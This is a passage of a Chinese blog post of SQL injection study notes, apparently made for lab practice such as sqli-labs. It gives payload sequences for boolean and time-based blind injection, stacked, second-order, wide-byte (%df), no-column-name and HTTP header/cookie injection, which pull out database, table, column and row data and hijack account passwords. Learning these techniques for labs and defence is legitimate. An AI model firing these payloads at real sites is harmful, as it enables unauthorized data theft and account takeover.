+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Length()    <span class="operator">/</span><span class="operator">/</span>返回字符串的长度</span><br><span class="line">Substr()    <span class="operator">/</span><span class="operator">/</span>截取字符串</span><br><span class="line">Ascii()      <span class="operator">/</span><span class="operator">/</span>返回字符的ascii码</span><br><span class="line">sleep(n)   <span class="operator">/</span><span class="operator">/</span>将程序挂起一段时间 n为n秒</span><br><span class="line">if(expr1,expr2,expr3)  <span class="operator">/</span><span class="operator">/</span>判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br><span class="line">limit m,n <span class="operator">/</span><span class="operator">/</span>表示从第m<span class="operator">+</span><span class="number">1</span>个数据开始，截取n条数据</span><br></pre></td></tr></table></figure>
+
+<p>主要是通过页面是否有报错来判断语句猜测是否正确。</p>
+<p>可以通过F12开发者工具的网络来看执行时间。</p>
+<p>查看是否存在注入点–&gt;</p>
+<p>判断注入类型–&gt;</p>
+<p>查看页面是否存在输出|是否存在报错提示–&gt;</p>
+<p>判断数据库名长度–&gt;and length(database())&gt;猜测的长度</p>
+<p>得到数据库库名–&gt;and ascii(substr(database(),1,1))&#x3D;猜测第一个的ASCII码</p>
+<p>判断表的数量–&gt;and (select count(*) from information_schema.tables where table_schema&#x3D;’库名’)&gt;猜测的表的个数</p>
+<p>依次判断表名的长度–&gt;and (length((select table_name from information_schema.tables where table_schema&#x3D;’库名’ limit 0,1)))&gt;猜测的表名长度</p>
+<p>依次得到表名–&gt;and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’库名’ limit 0,1),1,1)))&#x3D;猜测的表名第一个字母的ASCII码</p>
+<p>判断表中字段个数–&gt;and (select count(*) from information_schema.columns where table_name&#x3D;’表名’ and table_schema&#x3D;’库名’)&gt;猜测的字段个数</p>
+<p>依次判断表中字段名的长度–&gt;and (length((select column_name from information_schema.columns where table_name&#x3D;’表名’ and table_schema&#x3D;’库名’ limit 0,1)))&gt;猜测的字段名的长度</p>
+<p>依次判断表的字段名 –&gt; and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’表名’ and table_schema&#x3D;’库名’ limit 0,1),1,1))&#x3D;猜测字段名第一个字母的ASCII码</p>
+<p>依次判断字段中数据的长度–&gt;and (length((select 字段名 from 表名 limit 0,1)))&gt;猜测数据长度</p>
+<p>依次得到字段中的数据–&gt;and ascii(substr((select 字段名 from 表名 limit 0,1 ),1,1)))&#x3D;猜测数据第一位ASCII码</p>
+<h4 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h4><p>也叫时间盲注，也就是通过语句执行的时间来判断语句是否执行正确。如果猜测正确，会导致执行的时间很长，如果猜测错误，会导致执行的时间很短。</p>
+<p>判断站点是否存在回显|注入|错误提示 –&gt; 利用字符型|整数型判断</p>
+<p>判断站点是否存在时间盲注 –&gt; 字符型：’ and sleep(5) %23</p>
+<p> –&gt; 数字型：and sleep(5) %23</p>
+<p>判断站点的数据库长度 –&gt; and if(length(database())&gt;7,sleep(5),1)) %23</p>
+<p>判断站点的数据库名 –&gt; and if(ascii(substr(database(),1,1))&#x3D;100,sleep(5),1) %23</p>
+<p>判断表的个数 –&gt; and if((select count(*) from information_schema.tables where table_schema&#x3D;’库名’)&#x3D;5,sleep(5),1) %23</p>
+<p>依次判断表名长度 –&gt; and if(length((select table_name from information_schema.tables where table_schema&#x3D;’库名’ limit 0,1))&gt;5,sleep(5),1) %23</p>
+<p>依次判断表名 –&gt; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’库名’ limit 0,1),1,1)),sleep(5),1) %23</p>
+<p>依次判断表中的字段数量 –&gt; and if(select count(*) from information_schema.columns where table_name&#x3D;’表名’ and table_schema&#x3D;’库名’&#x3D;猜测的字段个数,sleep(5),1) %23</p>
+<p>依次判断表中的字段名长度 –&gt; and if(length((select column_name from information_schema.columns where table_name&#x3D;’表名’ and table_schema&#x3D;’库名’ limit 0,1))&gt;5,sleep(5),1) %23</p>
+<p>依次判断表中的字段名 –&gt; and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’表名’ and table_schema&#x3D;’库名’ limit 0,1),1,1))&#x3D;猜测字段名第一个字母的ASCII码,sleep(5),1)%23</p>
+<p>依次判断表中数据的长度 –&gt; and if((length((select 字段名 from 表名 limit 0,1)))&gt;猜测数据长度,sleep(5),1)%23</p>
+<p>依次判断表中数据 –&gt; and if(ascii(substr((select 字段名 from 表名 limit 0,1),1,1))&#x3D;x,sleep(5),1)%23</p>
+<h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>在sql语句中，分号为一个语句的结束，在一个语句结束后可以再继续添加语句，不同语句用分号隔开，造成堆叠注入。但是前提是存在注入漏洞，分号没有被过滤，没有禁止执行多条sql语句。其中mysqli_multi_query()这个函数就可以支持同时执行多条sql语句，而mysqli_query()函数一次只能执行一条语句。<img onerror="imgOnError(this);" data-fancybox="gallery" src="C:\Users\15819\AppData\Roaming\Typora\typora-user-images\image-20230111142700424.png" alt="image-20230111142700424" data-caption="image-20230111142700424" loading="lazy"></p>
+<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。</p>
+<p>防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
+<p>通俗一点的解释：用户输入数据–&gt;被防御者进行处理–&gt;再将数据存储至数据库中–&gt;数据恢复成本来的面貌–&gt;再次执行操作调用数据库中数据时，发生二次注入。</p>
+<p>一般来说，是通过注册账号来对数据库进行数据的恶意插入，这时一定要注意对其中特殊字符的转义。然后再对插入的数据进行引用。当插入数据后，如果存在数据调用(看是否有数据显示在页面上)，再考虑是否存在二次注入。如果没有，则不存在二次注入。二次注入用例题来解释更加直观。如sqlilab中的less24。如果原来已知一个账号为caef11，密码未知，我们可以通过注册一个caef11’#的账号，并修改密码，来修改caef11的密码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>把后一个判断密码是否正确的语句直接过滤，此时caef11’#为账号,就会更改caef11的密码，而不是caef11’#的密码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;caef11&#x27;#&#x27;&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>在介绍宽字节注入之前，先来介绍一些中文编码。在GB2312编码方式中，一个汉字需要两个字节来表示。GB2312基本满足了计算机处理简体汉字的需求，所收录的汉字覆盖了99.75%的使用频率，但对于罕见字和繁体字，GB2312就不能处理了。因此发明了后来的GBK和GB18030。表示一个汉字的两个字节的第一个字节叫做高位（区字节），第二个字节叫做低位（位字节）。</p>
+<p>为了防止网站被SQL注入，一些网站开发人员会做一些防护措施，其中最常见的就是对一些特殊字符进行转义。magic_qutes_gpc函数在php中的作用是解析用户提交的数据，如有：post、get、cookie过来的数据增加转义符“\” 以确保这些数据不会引起程序错误。当传递一个参数id&#x3D;1‘得时候，当我们输入这个单引号，会被认为是非法字符，会被过滤函数添加“\”给过滤掉，所以我们想要程序接受我们传递得参数中包含单引号，那么就需要把这个转义字符“\”干掉，那如何才能干掉呢？当http协议传输得时候，是要经过url编码的，如果这个编码完成后，传递到服务器时，我们可以在单引号前加上一个%df这样得编码，最后这样解码得时候，这个%df就会和“&#x2F;”对应得编码相结合按照gbk编码要求去解码，最后只剩下个单引号。</p>
+<p>通俗解释：输入id&#x3D;1’ (参数不一定是id) –&gt; ’ 会被过滤函数添加 \ 给过滤掉</p>
+<p> 不被过滤掉的方法就是去除 \，但是前提有两个1.数据库查询设置为GBK编码（或者位字节的范围能表示\的编码）2.使用了addslashes()，mysql_real_escape_string(),mysql_escape_string()之类的转义函数</p>
+<p>前面说到在GB2312的编码方式中，是两个字节来表示一个汉字，\经过url编码以后是%5c，既然是GBK编码，就可以在\前面再加一个字节，组成一个汉字，那么原来的?id&#x3D;1’  –&gt;?id&#x3D;1\ ‘ –&gt; ?id&#x3D;1%df%5c’  这样%df%5c会被解析成一个汉字，单引号就不会被过滤了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id =1%df&#x27; order by 3 %23</span><br></pre></td></tr></table></figure>
+
+<p>之后就可以进行正常的注入了。</p>
+<h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><p>需要无列名注入主要是因为column关键字被ban，无法获取列名，光针对于这个还是比较简单的，不知道列名就可以利用给联合查询出来的派生表起别名就可以直接查出数据，如果想查出列名就可以用join using。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select * from (select * from users a join users b)c#</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就会报错出第一个字段<img onerror="imgOnError(this);" data-fancybox="gallery" src="C:\Users\15819\AppData\Roaming\Typora\typora-user-images\image-20230111145339785.png" alt="image-20230111145339785" data-caption="image-20230111145339785" loading="lazy">然后就会爆出第二个字段username</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select * from (select * from users a join users b using(id,username))c#</span></span><br></pre></td></tr></table></figure>
+
+<p>直到爆出所有字段。</p>
+<p>这里有一个意外发现，当你将users写成一个不存在的表名时，还会爆出库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">as</span> a <span class="keyword">join</span> users <span class="keyword">as</span> b)<span class="keyword">as</span> c;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pSnVi7T"><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s1.ax1x.com/2023/01/11/pSnVi7T.png" alt="pSnVi7T.png" data-caption="pSnVi7T.png" loading="lazy"></a></p>
+<p>这个security便是库名。</p>
+<p>这边再提一下order by盲注，也可用于无列名注入。因为order by是按照一列把表按0-9，a-z来排列</p>
+<p>这样就可以一个字符一个字符来盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;id&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;o&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;id&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;p&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;id&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;q&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+
+<p>当盲注正确的时候回显会发生变化，就可以确定第一位了。</p>
+<p>还有子查询也可以用于无列名注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">3</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>)x;</span><br></pre></td></tr></table></figure>
+
+<p>相当于是给这个表取了一个1，2，3的别名，再通过别名来查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(`<span class="number">3</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)x;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(x<span class="number">.3</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)x;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(x.c) <span class="keyword">from</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)a,(<span class="keyword">select</span> <span class="number">2</span>)b,(<span class="keyword">select</span> <span class="number">3</span>)c <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)x;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<h4 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h4><p>http请求报文内容</p>
+<p>1.请求行：该部分包含了客户端的请求方式，请求资料名称，http协议版本号</p>
+<p>2.请求头：该部分定义了超文本传输协议事务中的操作参数，可根据自己的需要定义内容</p>
+<p>头部注入：一般获取头部等信息用于数据分析，但是通过请求头也可以向数据库发送查询信息，通过构造恶意的语句对数据库进行信息查询</p>
+<p>3.请求体：该部分包含了页面所提交的参数。</p>
+<p>关注页面中不太常见的关于useragent、referer、cookie等信息有没有在页面回显，即使没有回显也可以进行尝试，或者用sqlmap试着跑一下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>http头注入与上面的注入最大的不同还是在源代码上，因为通常来说useragent、referer、cookie等信息在数据库中不是select了，而是insert或者update，这就需要在闭合的时候小心一些，因为insert、update的数据个数有的时候不止一个，可以尝试a’  and … and ‘1’&#x3D;’1或者a’ or … or ‘这类来连接,不仅需要闭合这个单引号，还要保证整个句子能够执行。</p>
+<p>useragent使服务器能够识别客户使用的操作系统以及版本，CPU类型，浏览器及版本等，网站常常通过判断UA来给不同的操作系统、不同的浏览器发送不同的页面，因此可能造成某些页面无法在某个浏览器中正常显示，但也可以通过改变UA绕过检测。</p>
+<p>referer的作用是指示一个请求从哪里链接过来，注入方式和useragent是基本一样的。</p>
+<p>cookie本身是一串加密过的数据，是网站为了辨别用户身份而存在在用户本地终端。用户使用浏览器第一次访问网站服务器时，网站服务器会返回给用户浏览器一段数据，浏览器将其保存到本地，以后用户使用浏览器每次再访问网站服务器时，请求都带着这个cookie来标名自己的用户身份。</p>
+<p>cookie注入有两种方法，一种是sqlmap直接来跑出密文的加密值再用cmd5查表，还有一种是用burp截取报文手动删掉cookie进行闭合符号测试，或者用Google浏览器的cookie editor插件可以直接修改cookie。手动的话还是一样，要判断闭合符号，列数，有回显的位置，直接进行注入即可。</p>
+<p>那就暂时先这样吧ovo。</p>
+
+    <p><img data-fancybox="gallery" src="https://i.dawnlab.me/53a8c7cf3ad77a0f0a456ce2c6afe88a.png"  alt="53a8c7cf3ad77a0f0a456ce2c6afe88a.png" data-caption="53a8c7cf3ad77a0f0a456ce2c6afe88a.png" loading="lazy"></p>
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>本文作者：</strong>caef11<br>
+        <strong>本文链接：</strong><a href="http://caef11.github.io/2023/01/21/sql%E5%B0%8F%E8%AF%BE%E9%A2%98%EF%BC%88%E5%9F%BA%E7%A1%80%E7%89%88/" title="http:&#x2F;&#x2F;caef11.github.io&#x2F;2023&#x2F;01&#x2F;21&#x2F;sql%E5%B0%8F%E8%AF%BE%E9%A2%98%EF%BC%88%E5%9F%BA%E7%A1%80%E7%89%88&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;caef11.github.io&#x2F;2023&#x2F;01&#x2F;21&#x2F;sql%E5%B0%8F%E8%AF%BE%E9%A2%98%EF%BC%88%E5%9F%BA%E7%A1%80%E7%89%88&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          请在你的配置文件中设置评论框插槽
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E8%AF%BE%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">SQL注入课题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#information-schema"><span class="toc-number">1.0.2.</span> <span class="toc-text">information_schema</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%A4%A7%E7%B1%BB"><span class="toc-number">1.0.3.</span> <span class="toc-text">常见大类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml%EF%BC%9A"><span class="toc-number">1.0.3.2.1.</span> <span class="toc-text">updatexml：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#floor%EF%BC%9A"><span class="toc-number">1.0.3.2.2.</span> <span class="toc-text">floor：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp%EF%BC%9A"><span class="toc-number">1.0.3.2.3.</span> <span class="toc-text">exp：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#extractvalue%EF%BC%9A"><span class="toc-number">1.0.3.2.4.</span> <span class="toc-text">extractvalue：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.3.3.</span> <span class="toc-text">布尔注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.3.4.</span> <span class="toc-text">延时注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6"><span class="toc-number">1.0.4.</span> <span class="toc-text">进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.4.</span> <span class="toc-text">无列名注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.5.</span> <span class="toc-text">http头注入</span></a></li></ol></li></ol></li></ol></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="搜索"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1674296384966"></script>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+
+</body>
+
+</html>
